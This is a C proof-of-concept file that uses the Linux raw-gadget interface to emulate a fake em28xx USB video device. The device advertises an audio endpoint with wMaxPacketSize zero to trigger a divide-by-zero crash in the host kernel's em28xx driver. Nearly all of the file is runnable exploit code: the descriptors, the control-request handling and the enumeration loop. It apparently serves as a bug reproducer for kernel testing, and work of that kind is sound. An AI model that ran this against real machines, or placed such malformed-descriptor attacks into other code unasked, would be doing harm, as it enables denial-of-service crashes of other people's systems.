// gcc -O2 -static -o repro repro.c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <stdint.h>
#include <sys/ioctl.h>
#include <sys/types.h>

struct usb_ctrlrequest {
	uint8_t  bRequestType;
	uint8_t  bRequest;
	uint16_t wValue;
	uint16_t wIndex;
	uint16_t wLength;
} __attribute__((packed));

struct usb_device_descriptor {
	uint8_t  bLength;
	uint8_t  bDescriptorType;
	uint16_t bcdUSB;
	uint8_t  bDeviceClass;
	uint8_t  bDeviceSubClass;
	uint8_t  bDeviceProtocol;
	uint8_t  bMaxPacketSize0;
	uint16_t idVendor;
	uint16_t idProduct;
	uint16_t bcdDevice;
	uint8_t  iManufacturer;
	uint8_t  iProduct;
	uint8_t  iSerialNumber;
	uint8_t  bNumConfigurations;
} __attribute__((packed));

struct usb_config_descriptor {
	uint8_t  bLength;
	uint8_t  bDescriptorType;
	uint16_t wTotalLength;
	uint8_t  bNumInterfaces;
	uint8_t  bConfigurationValue;
	uint8_t  iConfiguration;
	uint8_t  bmAttributes;
	uint8_t  bMaxPower;
} __attribute__((packed));

struct usb_interface_descriptor {
	uint8_t  bLength;
	uint8_t  bDescriptorType;
	uint8_t  bInterfaceNumber;
	uint8_t  bAlternateSetting;
	uint8_t  bNumEndpoints;
	uint8_t  bInterfaceClass;
	uint8_t  bInterfaceSubClass;
	uint8_t  bInterfaceProtocol;
	uint8_t  iInterface;
} __attribute__((packed));

struct usb_endpoint_descriptor_std {
	uint8_t  bLength;
	uint8_t  bDescriptorType;
	uint8_t  bEndpointAddress;
	uint8_t  bmAttributes;
	uint16_t wMaxPacketSize;
	uint8_t  bInterval;
} __attribute__((packed));

#define USB_DT_DEVICE			0x01
#define USB_DT_CONFIG			0x02
#define USB_DT_STRING			0x03
#define USB_DT_INTERFACE		0x04
#define USB_DT_ENDPOINT			0x05

#define USB_REQ_GET_STATUS		0x00
#define USB_REQ_SET_ADDRESS		0x05
#define USB_REQ_GET_DESCRIPTOR		0x06
#define USB_REQ_GET_CONFIGURATION	0x08
#define USB_REQ_SET_CONFIGURATION	0x09
#define USB_REQ_SET_INTERFACE		0x0b

#define USB_TYPE_MASK			(0x03 << 5)
#define USB_TYPE_STANDARD		(0x00 << 5)
#define USB_TYPE_VENDOR			(0x02 << 5)
#define USB_DIR_IN			0x80

#define USB_SPEED_HIGH			3

#define UDC_NAME_LENGTH_MAX 128

struct usb_raw_init {
	uint8_t	driver_name[UDC_NAME_LENGTH_MAX];
	uint8_t	device_name[UDC_NAME_LENGTH_MAX];
	uint8_t	speed;
};

enum usb_raw_event_type {
	USB_RAW_EVENT_INVALID = 0,
	USB_RAW_EVENT_CONNECT = 1,
	USB_RAW_EVENT_CONTROL = 2,
	USB_RAW_EVENT_SUSPEND = 3,
	USB_RAW_EVENT_RESUME = 4,
	USB_RAW_EVENT_RESET = 5,
	USB_RAW_EVENT_DISCONNECT = 6,
};

struct usb_raw_event {
	uint32_t	type;
	uint32_t	length;
	uint8_t		data[0];
};

struct usb_raw_ep_io {
	uint16_t	ep;
	uint16_t	flags;
	uint32_t	length;
	uint8_t		data[0];
};

#define USB_RAW_IOCTL_INIT		_IOW('U', 0, struct usb_raw_init)
#define USB_RAW_IOCTL_RUN		_IO('U', 1)
#define USB_RAW_IOCTL_EVENT_FETCH	_IOR('U', 2, struct usb_raw_event)
#define USB_RAW_IOCTL_EP0_WRITE		_IOW('U', 3, struct usb_raw_ep_io)
#define USB_RAW_IOCTL_EP0_READ		_IOWR('U', 4, struct usb_raw_ep_io)
#define USB_RAW_IOCTL_CONFIGURE		_IO('U', 9)
#define USB_RAW_IOCTL_VBUS_DRAW		_IOW('U', 10, uint32_t)
#define USB_RAW_IOCTL_EP0_STALL		_IO('U', 12)

static int usb_raw_open(void)
{
	int fd = open("/dev/raw-gadget", O_RDWR);
	if (fd < 0) {
		perror("open(/dev/raw-gadget)");
		exit(1);
	}
	return fd;
}

static void usb_raw_init(int fd, const char *driver, const char *device,
			 uint8_t speed)
{
	struct usb_raw_init arg;
	memset(&arg, 0, sizeof(arg));
	strncpy((char *)arg.driver_name, driver, UDC_NAME_LENGTH_MAX - 1);
	strncpy((char *)arg.device_name, device, UDC_NAME_LENGTH_MAX - 1);
	arg.speed = speed;
	if (ioctl(fd, USB_RAW_IOCTL_INIT, &arg) < 0) {
		perror("ioctl(USB_RAW_IOCTL_INIT)");
		exit(1);
	}
}

static void usb_raw_run(int fd)
{
	if (ioctl(fd, USB_RAW_IOCTL_RUN, 0) < 0) {
		perror("ioctl(USB_RAW_IOCTL_RUN)");
		exit(1);
	}
}

static int usb_raw_event_fetch(int fd, struct usb_raw_event *event)
{
	return ioctl(fd, USB_RAW_IOCTL_EVENT_FETCH, event);
}

static int usb_raw_ep0_write(int fd, struct usb_raw_ep_io *io)
{
	return ioctl(fd, USB_RAW_IOCTL_EP0_WRITE, io);
}

static int usb_raw_ep0_read(int fd, struct usb_raw_ep_io *io)
{
	return ioctl(fd, USB_RAW_IOCTL_EP0_READ, io);
}

static void usb_raw_configure(int fd)
{
	if (ioctl(fd, USB_RAW_IOCTL_CONFIGURE, 0) < 0)
		perror("ioctl(USB_RAW_IOCTL_CONFIGURE)");
}

static void usb_raw_vbus_draw(int fd, uint32_t power)
{
	ioctl(fd, USB_RAW_IOCTL_VBUS_DRAW, power);
}

static void usb_raw_ep0_stall(int fd)
{
	ioctl(fd, USB_RAW_IOCTL_EP0_STALL, 0);
}

#define EM28XX_EP_AUDIO 0x83

static struct usb_device_descriptor dev_desc = {
	.bLength            = sizeof(struct usb_device_descriptor),
	.bDescriptorType    = USB_DT_DEVICE,
	.bcdUSB             = 0x0200,
	.bDeviceClass       = 0,
	.bDeviceSubClass    = 0,
	.bDeviceProtocol    = 0,
	.bMaxPacketSize0    = 64,
	.idVendor           = 0xeb1a,
	.idProduct          = 0x2820,
	.bcdDevice          = 0x0100,
	.iManufacturer      = 0,
	.iProduct           = 0,
	.iSerialNumber      = 0,
	.bNumConfigurations = 1,
};

#define CONFIG_TOTAL_LEN (9 + 9 + 9 + 7)

static unsigned char config_blob[CONFIG_TOTAL_LEN];

static void build_config(void)
{
	struct usb_config_descriptor *c;
	struct usb_interface_descriptor *i0, *i1;
	struct usb_endpoint_descriptor_std *e;
	unsigned char *p = config_blob;

	memset(config_blob, 0, sizeof(config_blob));

	c = (struct usb_config_descriptor *)p;
	c->bLength             = 9;
	c->bDescriptorType     = USB_DT_CONFIG;
	c->wTotalLength        = CONFIG_TOTAL_LEN;
	c->bNumInterfaces      = 1;
	c->bConfigurationValue = 1;
	c->iConfiguration      = 0;
	c->bmAttributes        = 0x80;
	c->bMaxPower           = 0x32;
	p += 9;

	i0 = (struct usb_interface_descriptor *)p;
	i0->bLength            = 9;
	i0->bDescriptorType    = USB_DT_INTERFACE;
	i0->bInterfaceNumber   = 1;
	i0->bAlternateSetting  = 0;
	i0->bNumEndpoints      = 0;
	i0->bInterfaceClass    = 0xff;
	i0->bInterfaceSubClass = 0;
	i0->bInterfaceProtocol = 0;
	i0->iInterface         = 0;
	p += 9;

	i1 = (struct usb_interface_descriptor *)p;
	i1->bLength            = 9;
	i1->bDescriptorType    = USB_DT_INTERFACE;
	i1->bInterfaceNumber   = 1;
	i1->bAlternateSetting  = 1;
	i1->bNumEndpoints      = 1;
	i1->bInterfaceClass    = 0xff;
	i1->bInterfaceSubClass = 0;
	i1->bInterfaceProtocol = 0;
	i1->iInterface         = 0;
	p += 9;

	e = (struct usb_endpoint_descriptor_std *)p;
	e->bLength          = 7;
	e->bDescriptorType  = USB_DT_ENDPOINT;
	e->bEndpointAddress = EM28XX_EP_AUDIO;
	e->bmAttributes     = 0x01;
	e->wMaxPacketSize   = 0x0000;
	e->bInterval        = 4;
}

static unsigned char str0[] = { 4, USB_DT_STRING, 0x09, 0x04 };

#define EP0_BUF 4096

struct ep0_io {
	struct usb_raw_ep_io inner;
	unsigned char data[EP0_BUF];
};

struct ev_buf {
	struct usb_raw_event inner;
	unsigned char data[sizeof(struct usb_ctrlrequest)];
};

static void fill_reg_read(unsigned char *buf, int len, uint16_t reg)
{
	memset(buf, 0, len);
	if (reg == 0x00 && len > 0)
		buf[0] = 0x10;
}

static void ep0_reply(int fd, struct usb_ctrlrequest *ctrl,
		      struct ep0_io *io, int len)
{
	uint16_t wLength = ctrl->wLength;

	if ((ctrl->bRequestType & USB_DIR_IN) && wLength) {
		if (len > wLength)
			len = wLength;
		if (len < 0)
			len = 0;
		io->inner.ep = 0;
		io->inner.flags = 0;
		io->inner.length = len;
		if (usb_raw_ep0_write(fd, (struct usb_raw_ep_io *)io) < 0)
			perror("ep0_write");
	} else {
		io->inner.ep = 0;
		io->inner.flags = 0;
		io->inner.length = (ctrl->bRequestType & USB_DIR_IN) ? 0 : wLength;
		if (io->inner.length > EP0_BUF)
			io->inner.length = EP0_BUF;
		if (usb_raw_ep0_read(fd, (struct usb_raw_ep_io *)io) < 0)
			perror("ep0_read");
	}
}

int main(void)
{
	int fd;
	struct ev_buf ev;
	struct ep0_io io;
	int n = 0;

	setvbuf(stdout, NULL, _IONBF, 0);
	build_config();

	printf("[*] em28xx wMaxPacketSize==0 divide-by-zero PoC\n");

	fd = usb_raw_open();
	usb_raw_init(fd, "dummy_udc", "dummy_udc.0", USB_SPEED_HIGH);
	usb_raw_run(fd);
	printf("[*] gadget running, waiting for enumeration...\n");

	for (;;) {
		struct usb_ctrlrequest *ctrl;
		uint16_t wValue, wLength;
		uint16_t wIndex;
		int len;

		memset(&ev, 0, sizeof(ev));
		ev.inner.type = 0;
		ev.inner.length = sizeof(struct usb_ctrlrequest);
		if (usb_raw_event_fetch(fd, (struct usb_raw_event *)&ev) < 0) {
			perror("event_fetch");
			break;
		}

		if (ev.inner.type != USB_RAW_EVENT_CONTROL) {
			printf("[*] event %u\n", ev.inner.type);
			continue;
		}

		ctrl = (struct usb_ctrlrequest *)ev.inner.data;
		wValue  = ctrl->wValue;
		wIndex  = ctrl->wIndex;
		wLength = ctrl->wLength;

		if (++n < 40)
			printf("[*] ctrl: %02x %02x v=%04x i=%04x l=%u\n",
			       ctrl->bRequestType, ctrl->bRequest,
			       wValue, wIndex, wLength);

		memset(&io, 0, sizeof(io));

		if ((ctrl->bRequestType & USB_TYPE_MASK) == USB_TYPE_VENDOR) {
			len = wLength > EP0_BUF ? EP0_BUF : wLength;
			if (ctrl->bRequestType & USB_DIR_IN)
				fill_reg_read(io.data, len, wIndex);
			ep0_reply(fd, ctrl, &io, len);
			continue;
		}

		switch (ctrl->bRequest) {
		case USB_REQ_GET_DESCRIPTOR:
			switch (wValue >> 8) {
			case USB_DT_DEVICE:
				memcpy(io.data, &dev_desc, sizeof(dev_desc));
				ep0_reply(fd, ctrl, &io, sizeof(dev_desc));
				break;
			case USB_DT_CONFIG:
				memcpy(io.data, config_blob, CONFIG_TOTAL_LEN);
				ep0_reply(fd, ctrl, &io, CONFIG_TOTAL_LEN);
				break;
			case USB_DT_STRING:
				memcpy(io.data, str0, sizeof(str0));
				ep0_reply(fd, ctrl, &io, sizeof(str0));
				break;
			default:
				usb_raw_ep0_stall(fd);
				break;
			}
			break;
		case USB_REQ_SET_CONFIGURATION:
			usb_raw_vbus_draw(fd, 0x32);
			usb_raw_configure(fd);
			ep0_reply(fd, ctrl, &io, 0);
			break;
		case USB_REQ_GET_CONFIGURATION:
			io.data[0] = 1;
			ep0_reply(fd, ctrl, &io, 1);
			break;
		case USB_REQ_SET_INTERFACE:
			ep0_reply(fd, ctrl, &io, 0);
			break;
		case USB_REQ_GET_STATUS:
			io.data[0] = 1;
			io.data[1] = 0;
			ep0_reply(fd, ctrl, &io, 2);
			break;
		default:
			usb_raw_ep0_stall(fd);
			break;
		}
	}

	printf("[!] event loop exited (bug did not trigger)\n");
	close(fd);
	return 0;
}
